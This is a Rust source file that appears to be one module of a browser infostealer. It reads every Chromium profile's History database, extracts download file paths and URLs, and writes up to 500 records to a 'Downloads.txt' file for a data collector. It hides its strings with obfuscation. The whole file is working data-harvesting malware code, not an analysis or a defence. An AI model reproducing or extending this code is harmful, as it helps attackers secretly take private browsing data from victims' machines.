use crate::chromium::BrowserData;
use crate::{Download, SqliteDatabase, read_and_collect_unique_records, to_string_and_write_all};
use alloc::borrow::ToOwned;
use alloc::sync::Arc;
use collector::{Browser, Collector};
use database::TableRecord;
use derive_new::new;
use filesystem::FileSystem;
use filesystem::path::Path;
use filesystem::storage::StorageFileSystem;
use obfstr::obfstr as s;
use tasks::{Task, parent_name};

const DOWNLOADS_CURRENT_PATH: usize = 2;
const DOWNLOADS_TAB_URL: usize = 16;

#[derive(new)]
pub(super) struct DownloadsTask {
    browser: Arc<BrowserData>,
}

impl<C: Collector, F: FileSystem> Task<C, F> for DownloadsTask {
    parent_name!("Downloads.txt");

    fn run(&self, parent: &Path, filesystem: &F, collector: &C) {
        let Some(mut downloads) = read_and_collect_unique_records::<SqliteDatabase, _, _>(
            &self.browser.profiles,
            &StorageFileSystem,
            |profile| profile / s!("History"),
            s!("Downloads"),
            extract_download_from_record,
        ) else {
            return;
        };

        downloads.truncate(500);
        collector
            .get_browser()
            .increase_downloads_by(downloads.len());
        let _ = to_string_and_write_all(&downloads, "\n\n", filesystem, parent);
    }
}

fn extract_download_from_record<R: TableRecord>(record: &R) -> Option<Download> {
    let saved_as = record.get_value(DOWNLOADS_CURRENT_PATH)?.as_string()?;
    let url = record.get_value(DOWNLOADS_TAB_URL)?.as_string()?;

    Some(Download { saved_as, url })
}
